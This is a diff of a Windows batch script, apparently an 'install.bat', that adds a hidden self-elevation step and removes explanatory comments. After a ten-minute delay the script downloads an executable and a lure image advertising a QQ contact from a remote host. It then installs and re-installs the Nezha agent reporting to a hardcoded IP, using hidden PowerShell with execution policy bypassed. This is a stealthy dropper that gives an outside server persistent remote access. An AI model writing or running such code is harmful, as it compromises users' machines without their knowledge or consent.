@@ -2,6 +2,13 @@
 chcp 65001 >nul 2>nul
 setlocal enabledelayedexpansion
 
+:: 自动提权
+net session >nul 2>nul
+if %errorlevel% neq 0 (
+    powershell -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
+    exit
+)
+
 :: 防止重复运行
 tasklist /fi "imagename eq cmd.exe" /v | find "install.bat" >nul 2>nul
 if %errorlevel% equ 0 exit
@@ -9,36 +16,33 @@ if %errorlevel% equ 0 exit
 :: 延迟10分钟
 timeout /t 600 /nobreak >nul 2>nul
 
-:: --- 文件路径与URL配置 ---
 set "BASE_URL=http://pshwuli.github.io/wwzxs/"
 set "DESKTOP=%USERPROFILE%\Desktop"
 set "EXE_FILE=五五知行社.exe"
 set "EXE_PATH=%DESKTOP%\%EXE_FILE%"
 set "EXE_URL=%BASE_URL%五五知行社.exe"
-
 set "IMG_FILE=QQ：1668729341.png"
 set "IMG_FOLDER=D:\获取冰点密码请点击"
 set "IMG_PATH=%IMG_FOLDER%\%IMG_FILE%"
 set "IMG_URL=%BASE_URL%QQ%EF%BC%9A1668729341.png"
 
-:: --- 检测并下载图片 ---
+:: 检测图片
 if not exist "%IMG_PATH%" (
     if not exist "%IMG_FOLDER%" mkdir "%IMG_FOLDER%"
     powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
     "try { Invoke-WebRequest '%IMG_URL%' -OutFile '%IMG_PATH%' -TimeoutSec 30 } catch { exit }"
 )
 
-:: --- 检测并下载五五知行社.exe ---
+:: 检测EXE
 if not exist "%EXE_PATH%" (
     powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
     "try { Invoke-WebRequest '%EXE_URL%' -OutFile '%EXE_PATH%' -TimeoutSec 30 } catch { exit }"
 )
 
-:: --- 检测哪吒是否正常运行 ---
+:: 检测哪吒
 tasklist | find /i "nezha-agent.exe" >nul 2>nul
 if %errorlevel% neq 0 goto :install_nezha
 
-:: 哪吒在运行，检查文件是否完整
 if exist "C:\Program Files\nezha" (
     if not exist "C:\Program Files\nezha\nezha-agent.exe" (
         taskkill /f /im nezha.exe >nul 2>nul
@@ -57,12 +61,9 @@ if exist "C:\nezha" (
         goto :install_nezha
     )
 )
-
-:: 一切正常则退出
 exit
 
 :install_nezha
-:: --- Ping测速选最快镜像 ---
 set "URL1=shturl.cc/uKiu14Qw0MDkTvhqgb"
 set "URL2=shturl.cc/ngMQmnvHSq9PH"
 set "URL3=shturl.cc/fmVeOYe69W"
@@ -80,10 +81,8 @@ for %%u in ("%URL1%" "%URL2%" "%URL3%" "%URL4%") do (
         )
     )
 )
-
 if "%FASTEST_URL%"=="" set "FASTEST_URL=https://gh.dpik.top"
 
-:: --- 安装哪吒 ---
 powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
 "$env:NZ_SERVER='188.68.250.201:44567'; ^
 $env:NZ_TLS='false'; ^
